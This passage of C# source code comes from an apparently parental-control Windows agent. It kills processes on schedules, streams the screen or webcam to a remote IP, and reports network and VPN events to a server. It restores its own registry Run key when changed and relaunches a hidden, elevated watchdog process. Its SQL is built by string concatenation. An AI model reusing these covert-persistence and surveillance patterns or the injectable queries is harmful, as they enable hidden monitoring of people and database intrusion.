                                                MessageBox.Show("Error");
                                            }
                                            if (DateTime.Now.CompareTo(Pac.Start) < 0)
                                            {

                                                MyTimer TimeWatcher = new MyTimer();
                                                System.Timers.Timer Target = new System.Timers.Timer((Pac.Start - DateTime.Now).TotalMilliseconds);
                                                Target.Elapsed += BeforAppLimitElipced;
                                                Target.Start();
                                                TimeWatcher.TimeWatcher = Target;
                                                TimeWatcher.ID = Data1[0];
                                                App2Timer.Add(TimeWatcher);
                                            }
                                            else
                                            {
                                                if ((DateTime.Now.CompareTo(Pac.Start) >= 0) && ((DateTime.Now.CompareTo(Pac.End) <= 0)))
                                                {

                                                    List<Process> Target = new List<Process>();
                                                    ProcessHandler.GetSpecificProcess(Data1[1], ref Target);
                                                    if (Target.Count > 0)
                                                    {
                                                        foreach (Process var in Target)
                                                        {
                                                            var.Kill();
                                                        }
                                                    }
                                                }
                                            }

                                        }; break;
                                    case (short)Packet.AppLimitAct.Disable:
                                        {
                                            try
                                            {
                                                App2Timer.Remove(App2Timer.Find(x => x.ID == Data1[0]));
                                                SqlCommand Command = new SqlCommand();
                                                Command.Connection = new SqlConnection(DataBaseAgent.ConnectionString);
                                                Command.CommandText = "Delete From AppLimit where ID = '" + Data[0] + "'";
                                                Command.ExecuteNonQuery();
                                            }
                                            catch (Exception T)
                                            {

                                            }
                                        }; break;
                                    case (short)Packet.AppLimitAct.CloseWithError:
                                        {

                                            try
                                            {
                                                if (DS.Tables.Contains("AppLimit") == false)
                                                {
                                                    DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimit");
                                                }
                                                DataRow Row = DS.Tables["AppLimit"].NewRow();
                                                Row["Start"] = Pac.Start;
                                                Row["End"] = Pac.End;
                                                Row["AppID"] = Pac.AppName;
                                                Row["Act"] = (short)Packet.AppLimitAct.CloseWithError;
                                                //DS.Tables.Remove("AppLimitAd");
                                                //DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimitAd");
                                                DS.Tables["AppLimit"].Rows.Add(Row);
                                                DataBaseAgent.InsertData(DS.Tables["AppLimit"]);
                                                //DS.Tables.Remove("AppLimit");
                                            }
                                            catch (Exception R)
                                            {
                                                MessageBox.Show("Error");
                                            }
                                            if (DateTime.Now.CompareTo(Pac.Start) < 0)
                                            {

                                                MyTimer TimeWatcher = new MyTimer();
                                                System.Timers.Timer Target = new System.Timers.Timer((Pac.Start - DateTime.Now).TotalMilliseconds);
                                                Target.Elapsed += BeforAppLimitElipced;
                                                Target.Start();
                                                TimeWatcher.TimeWatcher = Target;
                                                TimeWatcher.ID = Data1[0];
                                                App2Timer.Add(TimeWatcher);
                                            }
                                            else
                                            {
                                                if ((DateTime.Now.CompareTo(Pac.Start) >= 0) && ((DateTime.Now.CompareTo(Pac.End) <= 0)))
                                                {

                                                    List<Process> Target = new List<Process>();
                                                    ProcessHandler.GetSpecificProcess(Data1[1], ref Target);
                                                    if (Target.Count > 0)
                                                    {
                                                        foreach (Process var in Target)
                                                        {
                                                            var.Kill();
                                                            DialogResult Result = MessageBox.Show("Usage Time Expired ", " Parent Message", MessageBoxButtons.OK);
                                                        }
                                                    }
                                                }
                                            }

                                        }; break;
                                }

                            }; break;
                        case (short)Packet.PacketType.AppLimition3Time:
                            {
                                Packet Pack = new Packet();
                                Packet.AppLimition3Time Pac = Pack.ToPacket<Packet.AppLimition3Time>(Data);
                                string[] Data1 = Pac.AppName.Split('$');
                                switch (Pac.Act)
                                {
                                    case (short)Packet.AppLimitAct.Close:
                                        {

                                            try
                                            {
                                                if (DS.Tables.Contains("AppLimit") == false)
                                                {
                                                    DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimit");
                                                }
                                                DataRow Row = DS.Tables["AppLimit"].NewRow();
                                                Row["StartTime"] = Pac.Start;
                                                Row["EndTime"] = Pac.End;
                                                Row["Duration"] = Pac.Duration;
                                                Row["ID"] = Pac.AppName.Split('-')[0];
                                                Row["AppName"] = Pac.AppName.Split('-')[1];
                                                Row["Act"] = (short)Packet.AppLimitAct.Close;
                                                //DS.Tables.Remove("AppLimitAd");
                                                //DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimitAd");
                                                DS.Tables["AppLimit"].Rows.Add(Row);
                                                DataBaseAgent.InsertData(DS.Tables["AppLimit"]);
                                                //DS.Tables.Remove("AppLimit");
                                            }
                                            catch (Exception R)
                                            {
                                                MessageBox.Show("Error");
                                            }
                                            if (DateTime.Now.CompareTo(Pac.Start) < 0)
                                            {

                                                MyTimer3 TimeWatcher = new MyTimer3();
                                                System.Timers.Timer Target = new System.Timers.Timer((Pac.Start).TotalMilliseconds);
                                                Target.Elapsed += BeforAppLimitElipced;
                                                Target.Start();
                                                TimeWatcher.TimeWatcher = Target;
                                                TimeWatcher.ID = Data1[0];
                                                TimeWatcher.STW = new Stopwatch();
                                                TimeWatcher.STW.Start();
                                                App3Timer.Add(TimeWatcher);
                                            }
                                            else
                                            {
                                                if ((DateTime.Now.CompareTo(Pac.Start) >= 0) && ((DateTime.Now.CompareTo(Pac.End) <= 0)))
                                                {

                                                    List<Process> Target = new List<Process>();
                                                    ProcessHandler.GetSpecificProcess(Data1[1], ref Target);
                                                    if (Target.Count > 0)
                                                    {
                                                        foreach (Process var in Target)
                                                        {
                                                            var.Kill();
                                                        }
                                                    }
                                                }
                                            }

                                        }; break;
                                    case (short)Packet.AppLimitAct.Disable:
                                        {
                                            try
                                            {
                                                App2Timer.Remove(App2Timer.Find(x => x.ID == Data1[0]));
                                                DataBaseAgent.ExequteWithCommand("Delete From AppLimit where ID = '" + Data1[0] + "'");
                                                foreach (DataRow var in DS.Tables["AppLimit"].Rows)
                                                {
                                                    if (var["ID"].ToString() == Data1[0].ToString())
                                                    {
                                                        DS.Tables["AppLimit"].Rows.Remove(var);
                                                    }
                                                }

                                            }
                                            catch (Exception T)
                                            {

                                            }
                                        }; break;
                                    case (short)Packet.AppLimitAct.CloseWithError:
                                        {

                                            try
                                            {
                                                if (DS.Tables.Contains("AppLimit") == false)
                                                {
                                                    DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimit");
                                                }
                                                DataRow Row = DS.Tables["AppLimit"].NewRow();
                                                Row["StartTime"] = Pac.Start;
                                                Row["EndTime"] = Pac.End;
                                                Row["AppID"] = Pac.AppName;
                                                Row["Act"] = (short)Packet.AppLimitAct.CloseWithError;
                                                //DS.Tables.Remove("AppLimitAd");
                                                //DataBaseAgent.SelectData("AppLimit", ref DS, "AppLimitAd");
                                                DS.Tables["AppLimit"].Rows.Add(Row);
                                                DataBaseAgent.InsertData(DS.Tables["AppLimit"]);
                                                //DS.Tables.Remove("AppLimit");
                                            }
                                            catch (Exception R)
                                            {
                                                MessageBox.Show("Error");
                                            }
                                            if (DateTime.Now.CompareTo(Pac.Start) < 0)
                                            {

                                                MyTimer TimeWatcher = new MyTimer();
                                                System.Timers.Timer Target = new System.Timers.Timer((Pac.Start).TotalMilliseconds);
                                                Target.Elapsed += BeforSystemLimitElipced;
                                                Target.Start();
                                                TimeWatcher.TimeWatcher = Target;
                                                TimeWatcher.ID = Data1[0];
                                                App2Timer.Add(TimeWatcher);
                                            }
                                            else
                                            {
                                                if ((DateTime.Now.CompareTo(Pac.Start) >= 0) && ((DateTime.Now.CompareTo(Pac.End) <= 0)))
                                                {

                                                    List<Process> Target = new List<Process>();
                                                    ProcessHandler.GetSpecificProcess(Data1[1], ref Target);
                                                    if (Target.Count > 0)
                                                    {
                                                        foreach (Process var in Target)
                                                        {
                                                            var.Kill();
                                                            DialogResult Result = MessageBox.Show("Usage Time Expired ", " Parent Message", MessageBoxButtons.OK);
                                                        }
                                                    }
                                                }
                                            }

                                        }; break;
                                }
                                //NewRow["Act"] = Pac.Act;
                                //NewRow["Start"] = Pac.Start;
                                //NewRow["End"] = Pac.End;
                                //NewRow["AppName"] = Pac.AppName;
                                //NewRow["Duration"] = Pac.Duration;

                            }; break;
                        case (short)Packet.PacketType.RealTimeMonitor:
                            {
                                Packet Pack = new Packet();
                                Packet.RealTimeMonitor Pac = Pack.ToPacket<Packet.RealTimeMonitor>(Data);
                                if (Pac.DeviceType == false)
                                {
                                    Connection.RealTimeMonitoring(Pac.IP, Pac.Port, 1);
                                }
                                else
                                {
                                    Connection.RealTimeMonitoringWebCam(Pac.IP, Pac.Port, 1);
                                }


                            }; break;
                        case (short)Packet.PacketType.UnInstall:
                            {
                                Packet Pack = new Packet();
                                Packet.UnInstall Pac = Pack.ToPacket<Packet.UnInstall>(Data);
                                if (Pac.ParentID == DS.Tables["Data"].Rows[3]["DataContent"].ToString())
                                {
                                    Uninstall();
                                }


                            }; break;
                    }
                }
            }
            catch (Exception R)
            {

            }


        }

        private void Duration_Elapsed(object sender, ElapsedEventArgs e)
        {
            try
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer3 TargetInstance = System3Timer.Find(x => x.TimeWatcher == Target);
                string ID = TargetInstance.ID;
                TargetInstance.STW.Stop();
                //if (DS.Tables.Contains("SystemLimit") == false)
                //{
                //    DataBaseAgent.SelectData("SystemLimit", ref DS, "*", "SystemLimitTarget", ID, "ID");
                //}
                DataRow Row = DS.Tables["SystemLimit"].Rows.Find(ID);
                Row["Remaining"] = 0;

                DataBaseAgent.InsertData(DS.Tables["SystemLimit"]);
                //DS.Tables.Remove("SystemLimitTarget");
                System3Timer.Remove(TargetInstance);
                DoSystem((short)Row["Act"]);

            }
            catch (Exception EE)
            {

            }
        }

        private void BeforNetworkLimitElipced(object sender, ElapsedEventArgs e)
        {
            try
            {

                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer Finded = NetWork2Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["NetworkLimit"].Rows.Find(Finded.ID);
                Finded.TimeWatcher.Stop();
                Finded.TimeWatcher.Elapsed -= BeforAppLimitElipced;
                Finded.TimeWatcher.Elapsed += EndAppLimitElipced;
                Finded.TimeWatcher.Interval = ((DateTime)Row["EndTime"] - (DateTime)Row["StartTime"]).TotalMinutes;
                Finded.TimeWatcher.Start();
                NetWork.Disable(Row["Name"].ToString());
                //NetWork2Timer.Remove(NetWork2Timer.Find(x => x.TimeWatcher == Target));
            }
            catch (Exception E)
            {

                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer3 Finded = System3Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["NetworkLimit"].Rows.Find(Finded.ID);
                Finded.TimeWatcher.Stop();
                Finded.TimeWatcher.Elapsed -= BeforNetworkLimitElipced;
                Finded.TimeWatcher.Elapsed += EndNetworkLimitElipced;
                Finded.TimeWatcher.Interval = ((DateTime)Row["EndTime"] - (DateTime)Row["StartTime"]).TotalMinutes;
                Finded.TimeWatcher.Start();
                NetWork.Disable(Row["Name"].ToString());
                Finded.STW.Stop();
                Row["Remaining"] = Finded.Duration.Interval - Finded.STW.Elapsed.TotalMinutes;

                DataBaseAgent.InsertData(DS.Tables["NetworkLimit"]);
                //Network3Timer.Remove(Network3Timer.Find(x => x.TimeWatcher == Target));
            }


        }

        private void EndNetworkLimitElipced(object sender, ElapsedEventArgs e)
        {
            try
            {
                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer Finded = NetWork2Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["NetworkLimit"].Rows.Find(Finded.ID);
                DateTime TempDate = (DateTime)Row["StartTime"];
                DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["StartTime"] = Start;
                TempDate = (DateTime)Row["EndTime"];
                Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["EndTime"] = Start;
                DataBaseAgent.InsertData(DS.Tables["NetworkLimit"]);
                Finded.TimeWatcher.Stop();
                Finded.TimeWatcher.Elapsed += BeforNetworkLimitElipced;
                Finded.TimeWatcher.Elapsed -= EndNetworkLimitElipced;
                Finded.TimeWatcher.Interval = (DateTime.Now - Start).TotalMinutes;
                Finded.TimeWatcher.Start();
                //NetWork.Disable(Row["Name"].ToString());
                //NetWork2Timer.Remove(NetWork2Timer.Find(x => x.TimeWatcher == Target));
            }
            catch (Exception E)
            {

                System.Timers.Timer Target = sender as System.Timers.Timer;
                MyTimer3 Finded = System3Timer.Find(x => x.TimeWatcher == Target);
                DataRow Row = DS.Tables["NetworkLimit"].Rows.Find(Finded.ID);
                DateTime TempDate = (DateTime)Row["StartTime"];
                DateTime Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["StartTime"] = Start;
                TempDate = (DateTime)Row["EndTime"];
                Start = new DateTime(DateTime.Now.Year, DateTime.Now.Month, DateTime.Now.Day + 1, TempDate.Hour, TempDate.Minute, TempDate.Second);
                Row["EndTime"] = Start;
                Finded.TimeWatcher.Stop();
                Finded.TimeWatcher.Elapsed += BeforNetworkLimitElipced;
                Finded.TimeWatcher.Elapsed -= EndNetworkLimitElipced;
                Finded.TimeWatcher.Interval = (DateTime.Now - Start).TotalMinutes;
                Finded.TimeWatcher.Start();
                Finded.STW.Restart();
                DataBaseAgent.InsertData(DS.Tables["NetworkLimit"]);
            }
        }

        public void DoSystem(short oparation)
        {
            string filename = string.Empty;
            string arguments = string.Empty;
            switch (oparation)
            {
                case (short)Packet.SystemLimitAct.ShutDown:
                    filename = "shutdown.exe";
                    arguments = "-s";
                    break;
                case (short)Packet.SystemLimitAct.Reboot:
                    filename = "shutdown.exe";
                    arguments = "-r";
                    break;
                case (short)Packet.SystemLimitAct.Logoff:
                    filename = "shutdown.exe";
                    arguments = "-l";
                    break;
                case (short)Packet.SystemLimitAct.Lock:
                    filename = "Rundll32.exe";
                    arguments = "User32.dll, LockWorkStation";
                    break;
                case (short)Packet.SystemLimitAct.Hiber:
                    filename = @"%windir%\system32\rundll32.exe";
                    arguments = "PowrProf.dll, SetSuspendState";
                    break;
                case (short)Packet.SystemLimitAct.Sleep:
                    filename = "Rundll32.exe";
                    arguments = "powrprof.dll, SetSuspendState 0,1,0";
                    break;
            }
            ProcessStartInfo startinfo = new ProcessStartInfo(filename, arguments);
            Process.Start(startinfo);
            this.Close();
        }

        private void TimeWatcher_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            byte[] Data = null;
            ScreenShot.FullScreenShot(0, ref Data);
            Remainning -= TimeWatcher.Interval;
            if (Remainning > 0)
            {
                TimeWatcher.Start();
            }
            else
            {
                TimeWatcher.Stop();
            }
        }

        public void Initial()
        {
            //SqlCommand Command = new SqlCommand("Select COUNT(*) From InstalledApp");
            //int Number = (int)Command.ExecuteScalar();
            //if (Number == 0)
            //{
            //    SqlDataAdapter DA = new SqlDataAdapter("Select * From InstalledApp", DataBaseAgent.ConnectionString);
            //    DA.Fill(DS);
            //    AppTools.GetAllApps();
            //}
            //else
            //{
            //    SqlDataAdapter DA = new SqlDataAdapter("Select * From InstalledApp", DataBaseAgent.ConnectionString);
            //    DA.Fill(DS);
            //}
            Task.Run(() =>
            {
                CheckForInternetConnection();
            });


        }

        private void SturtupChange(object sender, EventArrivedEventArgs e)
        {
            try
            {
                string Path = Run.GetValue("WindowsAgent").ToString();
                if (Path != Application.ExecutablePath.ToString())
                {
                    throw new Exception("has Change");
                }


            }
            catch (Exception ee)
            {
                Run.SetValue("WindowsAgent", Application.ExecutablePath.ToString());
            }
            try
            {

                string Path = Run.GetValue("WindowsAgentSpare").ToString();
                if (Path != (Application.StartupPath.ToString() + "\\" + "SpareWF.exe"))
                {
                    throw new Exception("has Change");
                }
            }
            catch (Exception ee)
            {
                Run.SetValue("WindowsAgentSpare", Application.StartupPath.ToString() + "\\" + "SpareWF.exe");
            }

        }

        public void SetEventOnSturtup(EventArrivedEventHandler Handler)
        {
            string keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            var currentUser = WindowsIdentity.GetCurrent();
            var query = new WqlEventQuery(string.Format(
            "SELECT * FROM RegistryKeyChangeEvent WHERE Hive='HKEY_USERS' AND KeyPath='{0}\\\\{1}'",
            currentUser.User.Value, keyPath.Replace("\\", "\\\\")));
            Sturtup = new ManagementEventWatcher(query);
            Sturtup.EventArrived += Handler;
            Sturtup.Start();

        }

        private void UninstallOrInstallApp()
        {
            Packet Pack = new Packet();
            DataBaseAgent.SelectData("InstalledApps", ref DS, "InstalledApps");
            int InstalledAppsCount = DS.Tables["InstalledAppsID"].Rows.Count;
            if (InstalledAppsCount != AppTools.GetSubKeyCount("32") + AppTools.GetSubKeyCount("64"))
            {
                string AppsID = AppTools.CheckAllRegForApp(DS.Tables["InstalledAppsID"]);
                if (AppsID != "")
                {
                    SMUN.WaitOne();
                    DataBaseAgent.SelectData("InstalledApps", ref DS, "*", "InstalledAppsFull", AppsID, "AppID");
                    DataRow Row = DS.Tables["InstalledApps"].Rows[0];
                    DS.Tables["InstalledAppsID"].Rows.Remove(Row);
                    DataBaseAgent.InsertData(DS.Tables["InstalledApps"]);
                    SMUN.Release();
                    Packet.UnInstalledApps UnistalLog = new Packet.UnInstalledApps();
                    Packet.ProPacket UnistallPro = new Packet.ProPacket();
                    UnistalLog.Name = Row["DisplayName"].ToString();
                    UnistalLog.UnInstallDate = DateTime.Now.ToString();
                    UnistallPro.ID = Connection.ID;
                    UnistallPro.Type = (short)Packet.PacketType.UnInstalledApps;
                    string Data = Pack.ToString(UnistalLog);
                    string ProPackData = Pack.ToString(UnistallPro);
                    UnistallPro.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                    if (Connection.ConnectionIsAlive == true)
                    {
                        Connection.SendDataSM.WaitOne();
                        Packet.MainPacket MPacket = new Packet.MainPacket();
                        MPacket.PPacket = ProPackData;
                        MPacket.Data = Data;
                        Connection.SendToServer(Pack.ToString(MPacket));
                        //Connection.SendToServer(Data);
                        Connection.SendDataSM.Release();
                    }
                    else
                    {
                        DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                        RRow["ProPack"] = ProPackData;
                        RRow["Data"] = Data;
                        MeesageAdd.WaitOne();
                        RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                        Thread.Sleep(10);
                        DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                        MeesageAdd.Release();
                        DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                    }
                }
            }
        }

        public TimeSpan ToTimespan(DateTime Date)
        {
            TimeSpan Time = new TimeSpan(Date.Hour, Date.Minute, Date.Second);
            return Time;
        }

        private void LocationStatsChange(object sender, EventArrivedEventArgs e)
        {
            if (LocationService == false)
            {
                LocationService = true;
            }
            else
            {
                LocationService = false;
            }
        }

        private void IPChange(object sender, EventArgs e)
        {
            try
            {
                if ((DisConnectAdaptor == false) && (ConnectAdaptor == false) && (NetWork.VPN == 0))
                {
                    Packet Pack = new Packet();
                    bool Temp = InternetConnection;
                    CheckForInternetConnection();
                    DataBaseAgent.SelectData("Network", ref DS, "Network");
                    DataRow Row = DS.Tables["Network"].NewRow();
                    string NetData = NetWork.GetConnectionInterfaceName();
                    Packet.NetworkStatus NetPack = new Packet.NetworkStatus();
                    NetPack.Data = NetData;
                    NetPack.Time = DateTime.Now;
                    if ((Temp == !InternetConnection) && (InternetConnection == false))
                    {
                        // Connect to Net work o internet 
                        NetPack.Type = (short)Packet.NetworkStatusType.NoInternet;
                    }
                    else
                    {
                        if ((InternetConnection == false))
                        {
                            // Connect to Net work o internet 
                            NetPack.Type = (short)Packet.NetworkStatusType.NoInternet;
                        }
                        else
                        {
                            NetPack.Type = (short)Packet.NetworkStatusType.Connected;
                        }

                    }
                    string Data = Pack.ToString(NetPack);
                    Row["Date"] = Data;
                    DS.Tables["Network"].Rows.Add(Row);
                    DataBaseAgent.InsertData(DS.Tables["Network"]);
                    DS.Tables.Remove("Network");
                    Packet.ProPacket NetPro = new Packet.ProPacket();
                    NetPro.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                    NetPro.Type = (short)Packet.PacketType.NetworkStatusNow;
                    NetPro.TotalSize = Encoding.Unicode.GetBytes(Data).Length;

                    DataRow LogRow = DS.Tables["MessageLog"].NewRow();
                    string ProPackData = Pack.ToString(NetPro);
                    LogRow["Data"] = Data;

                    LogRow["Send"] = 0;
                    MeesageAdd.WaitOne();
                    //LogRow["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
                    LogRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    DS.Tables["MessageLog"].Rows.Add(LogRow);
                    MeesageAdd.Release();
                    //DS.Tables["MessageLog"].AcceptChanges();
                    DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
                    if (Connection.ConnectionIsAlive == true)
                    {
                        Connection.SendDataSM.WaitOne();
                        Packet.MainPacket MPacket = new Packet.MainPacket();
                        MPacket.PPacket = ProPackData;
                        MPacket.Data = Data;

                        Connection.SendToServer(Pack.ToString(MPacket));
                        Connection.SendDataSM.Release();
                    }
                    else
                    {
                        DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                        RRow["ProPack"] = ProPackData;
                        RRow["Data"] = Data;
                        MeesageAdd.WaitOne();
                        RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                        Thread.Sleep(10);
                        DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                        MeesageAdd.Release();
                        DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                    }
                }
            }
            catch (Exception E)
            {

            }


        }

        private void DisConnect(object sender, EventArrivedEventArgs e)
        {
            Packet Pack = new Packet();
            DisConnectAdaptor = true;
            List<string> TempAdaptor = new List<string>();
            NetWork.GetAllAdapter(ref TempAdaptor);
            foreach (string var in AllNetWorkAdaptors)
            {
                if (TempAdaptor.Contains(var) == false)
                {
                    Packet.NetworkStatus NetPack = new Packet.NetworkStatus();
                    NetPack.Data = var;
                    NetPack.Time = DateTime.Now;
                    NetPack.Type = (short)Packet.NetworkStatusType.DisConnected;
                    Packet.ProPacket ProNet = new Packet.ProPacket();
                    ProNet.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                    ProNet.Type = (short)Packet.PacketType.NetworkStatusNow;
                    string Data = Pack.ToString(NetPack);
                    ProNet.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                    DataRow Row = DS.Tables["MessageLog"].NewRow();
                    Row["Data"] = Data;

                    Row["Send"] = 0;
                    MeesageAdd.WaitOne();
                    Row["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    //Row["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
                    DS.Tables["MessageLog"].Rows.Add(Row);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
                    string ProPackData = Pack.ToString(ProNet);
                    if (Connection.ConnectionIsAlive == true)
                    {
                        Connection.SendDataSM.WaitOne();
                        Packet.MainPacket MPacket = new Packet.MainPacket();
                        MPacket.PPacket = ProPackData;
                        MPacket.Data = Data;
                        Connection.SendToServer(Pack.ToString(MPacket));
                        Connection.SendDataSM.Release();
                    }
                    else
                    {
                        DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                        RRow["ProPack"] = ProPackData;
                        RRow["Data"] = Data;
                        MeesageAdd.WaitOne();
                        RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                        Thread.Sleep(10);
                        DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                        MeesageAdd.Release();
                        DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                    }
                }
            }
            DisConnectAdaptor = false;
            AllNetWorkAdaptors = TempAdaptor;
        }

        private void Connect(object sender, EventArrivedEventArgs e)
        {
            ConnectAdaptor = true;
            Packet Pack = new Packet();
            List<string> TempAdaptor = new List<string>();
            NetWork.GetAllAdapter(ref TempAdaptor);
            foreach (string var in TempAdaptor)
            {
                if (AllNetWorkAdaptors.Contains(var) == false)
                {
                    Packet.NetworkStatus NetPack = new Packet.NetworkStatus();
                    NetPack.Data = var;
                    NetPack.Time = DateTime.Now;
                    NetPack.Type = (short)Packet.NetworkStatusType.Connected;
                    Packet.ProPacket ProNet = new Packet.ProPacket();
                    ProNet.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
                    ProNet.Type = (short)Packet.PacketType.NetworkStatusNow;
                    string Data = Pack.ToString(NetPack);
                    ProNet.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
                    DataRow Row = DS.Tables["MessageLog"].NewRow();
                    Row["Data"] = Data;

                    Row["Send"] = 0;
                    MeesageAdd.WaitOne();
                    Row["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                    Thread.Sleep(10);
                    //Row["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
                    DS.Tables["MessageLog"].Rows.Add(Row);
                    MeesageAdd.Release();
                    DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
                    string ProPackData = Pack.ToString(ProNet);
                    if (Connection.ConnectionIsAlive == true)
                    {
                        Connection.SendDataSM.WaitOne();
                        Packet.MainPacket MPacket = new Packet.MainPacket();
                        MPacket.PPacket = ProPackData;
                        MPacket.Data = Data;
                        Connection.SendToServer(Pack.ToString(MPacket));
                        //Connection.SendToServer(Data);
                        Connection.SendDataSM.Release();
                    }
                    else
                    {
                        DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                        RRow["ProPack"] = ProPackData;
                        RRow["Data"] = Data;
                        MeesageAdd.WaitOne();
                        RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                        Thread.Sleep(10);
                        DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                        MeesageAdd.Release();
                        DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
                    }
                    //DataBaseAgent.SelectData("NetworkLimit", ref DS, "*", "NetworkLimitConnected", var, "Name");
                    //NetWork.Disable(DS.Tables["NetworkLimitConnected"].Rows[0]["Name"].ToString());
                    //DS.Tables.Remove("NetworkLimitConnected");
                }
            }
            ConnectAdaptor = false;
        }

        private void VPNChange(object sender, EventArrivedEventArgs e)
        {
            Packet Pack = new Packet();
            int Status = NetWork.VPNCheck();
            Packet.NetworkStatus NetPack = new Packet.NetworkStatus();
            NetPack.Data = "VPN";
            NetPack.Time = DateTime.Now;
            if (Status == 0)
            {
                NetPack.Type = (short)Packet.NetworkStatusType.VpnOff;
            }
            else
            {
                NetPack.Type = (short)Packet.NetworkStatusType.VPNOn;
            }

            Packet.ProPacket ProNet = new Packet.ProPacket();
            ProNet.ID = DS.Tables["Data"].Rows[2]["DataContent"].ToString();
            ProNet.Type = (short)Packet.PacketType.NetworkStatusNow;
            string Data = Pack.ToString(NetPack);
            ProNet.TotalSize = Encoding.Unicode.GetBytes(Data).Length;
            DataRow Row = DS.Tables["MessageLog"].NewRow();
            Row["Data"] = Data;


            Row["Send"] = 0;
            MeesageAdd.WaitOne();
            Row["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
            Thread.Sleep(10);
            //Row["ID"] = DataBaseAgent.ExequteWithCommandScaler("Select NEWID()");
            DS.Tables["MessageLog"].Rows.Add(Row);
            MeesageAdd.Release();
            DataBaseAgent.InsertData(DS.Tables["MessageLog"]);
            string ProPackData = Pack.ToString(ProNet);
            if (Connection.ConnectionIsAlive == true)
            {
                Connection.SendDataSM.WaitOne();
                Packet.MainPacket MPacket = new Packet.MainPacket();
                MPacket.PPacket = ProPackData;
                MPacket.Data = Data;
                Connection.SendToServer(Pack.ToString(MPacket));
                //Connection.SendToServer(Data);
                Connection.SendDataSM.Release();
            }
            else
            {
                DataRow RRow = DS.Tables["MessageLogRemaining"].NewRow();
                RRow["ProPack"] = ProPackData;
                RRow["Data"] = Data;
                MeesageAdd.WaitOne();
                RRow["Date"] = DateTime.Now.ToString("MM/dd/yyyy HH:mm:ss.fffff");
                Thread.Sleep(10);
                DS.Tables["MessageLogRemaining"].Rows.Add(RRow);
                MeesageAdd.Release();
                DataBaseAgent.InsertData(DS.Tables["MessageLogRemaining"]);
            }
        }

        private void ProcessOutcoming(object sender, EventArrivedEventArgs e)
        {
            Packet Pack = new Packet();
            string ProceName = ((ManagementBaseObject)e.NewEvent["TargetInstance"])["Name"].ToString();
            if (ProceName.Contains("SpareWF") == true)
            {
                ProcessStartInfo StartInfo = new ProcessStartInfo(((ManagementBaseObject)e.NewEvent["TargetInstance"])["ExecutablePath"].ToString());
                StartInfo.UseShellExecute = true;
                StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                StartInfo.Verb = "runas";
                Process process = new Process();
                process.StartInfo = StartInfo;
                process.Start();
            }
            Task.Run(() =>
            {

                try
                {
                    MyTimer3 Target = App3Timer.Find(x => x.ID.Contains(ProceName) == true);
                    if (Target.ID != null)
                    {
                        Target.STW.Stop();
                        DS.Tables["AppLimit"].Rows.Find(Target.ID)["Remaining"] = Target.Duration.Interval - Target.STW.Elapsed.TotalMinutes;
                        DataBaseAgent.InsertData(DS.Tables["AppLimit"]);
                        App3Timer.Remove(Target);
                    }

                }
                catch (Exception E)
                {

                }
                try
                {
                    int ResultDBVoice = (int)DataBaseAgent.ExequteWithCommandScaler("Select Count(*) From VoiceProcess where ProcessName ='" + ProceName.Replace(".exe", "") + "'");
                    if (ResultDBVoice != 0)
                    {
                        if (VoiceAgent.Runing == true)
                        {
                            STV(ProceName.Replace(".exe", ""));
                        }
                    }
